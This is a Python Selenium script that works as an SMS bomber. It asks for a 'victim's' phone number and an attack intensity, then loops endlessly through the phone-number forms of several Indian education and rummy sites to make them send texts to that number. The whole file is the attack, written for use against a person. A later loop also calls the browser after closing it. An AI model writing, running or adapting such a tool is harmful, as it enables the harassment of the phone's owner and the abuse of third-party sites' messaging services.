from selenium import webdriver
import time


numb=int(input("ENTER VICTIM'S NUMBER : "))

attacks=int(input("\nenter attack mode : \nEASY(1)\nmedium(2)\nrapid burst(3) : "))

if attacks==1:
    attacks=5
elif attacks==2:
    attacks=10

elif attacks==3:
    attacks=20        




# del_ay=int(input("\nenter SMS delay(seconds) : "))
del_ay=0

while(True):
    brwsr=webdriver.Chrome()



    for i in range(attacks+1):
    
        # brwsr.get('https://www.rummyrwcircle.com/')

        # numcls=brwsr.find_element("xpath",'//*[@id="mobile_input"]')

        # numcls.send_keys(numb)

        # buttn=brwsr.find_element("xpath",'//*[@id="getStarted"]')
        # buttn.click()
        # time.sleep(del_ay)

        brwsr.get('https://byjus.com/')    
        m= brwsr.find_element("xpath",'/html/body/section[2]/div[2]/div/div/div[2]/div/div/form[1]/div[1]/div[1]/div[2]/div/input')
        m.send_keys(numb)

        v=brwsr.find_element("xpath",'/html/body/section[2]/div[2]/div/div/div[2]/div/div/form[1]/div[1]/div[1]/div[2]/div/button')
        v.click()
        time.sleep(del_ay)



        brwsr.get('https://www.a23.com/rummy.html')    
        m= brwsr.find_element("xpath",'//*[@id="wrapper"]/div[1]/div/div[2]/div/div[4]/div/app-link-box/div/div[2]/input')
        m.send_keys(numb)

        v=brwsr.find_element("xpath",'//*[@id="wrapper"]/div[1]/div/div[2]/div/div[4]/div/app-link-box/div/div[3]/a')
        v.click()
        time.sleep(del_ay)


        brwsr.get('https://www.mpl.live/rummy')    
        m= brwsr.find_element("xpath",'//*[@id="mobile"]')
        m.send_keys(numb)

        v=brwsr.find_element("xpath",'//*[@id="sms-but"]')
        v.click()
        time.sleep(del_ay)



        brwsr.get('https://www.rummyculture.com/')    
        m= brwsr.find_element("xpath",'//*[@id="mobile-landing"]')
        m.send_keys(numb)

        v=brwsr.find_element("xpath",'//*[@id="send-app-link"]/span/span')
        v.click()
        time.sleep(del_ay)          





    brwsr.quit()    


    for j in range(attacks):

        brwsr.get('https://byjus.com/')    
        m= brwsr.find_element("xpath",'/html/body/section[2]/div[2]/div/div/div[2]/div/div/form[1]/div[1]/div[1]/div[2]/div/input')
        m.send_keys(numb)

        v=brwsr.find_element("xpath",'/html/body/section[2]/div[2]/div/div/div[2]/div/div/form[1]/div[1]/div[1]/div[2]/div/button')
        v.click()
        time.sleep(del_ay)

brwsr.quit()    